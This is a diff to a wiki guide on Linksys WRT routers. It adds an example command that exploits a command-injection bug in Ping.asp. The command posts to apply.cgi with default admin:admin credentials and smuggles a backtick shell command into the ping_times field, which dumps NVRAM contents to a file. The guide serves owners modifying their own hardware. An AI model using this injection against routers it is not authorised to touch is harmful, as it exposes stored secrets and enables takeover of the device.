@@ -190,6 +190,12 @@ There is another bug still present in Ping.asp (firmware revision 3.03.1) where 
 `/usr/sbin/nvram show > /tmp/ping.log`
 }}}
 
+For instance, if you are in Unix and have Perl and LWP installed, you may issue this command:
+
+{{{
+echo 'submit_button=Ping&submit_type=start&action=Apply&change_action=gozila_cgi&ping_ip=10.0.0.1&ping_times=`/usr/sbin/nvram show > /tmp/ping.log`'|POST -C admin:admin http://192.168.1.1/apply.cgi
+}}}
+
 === Setting boot_wait from a serial connection ===
 
 With a serial connection to your WRT, you don't have to use the ping bug or change your Linksys firmware. You can set boot_wait from the console, using the commands
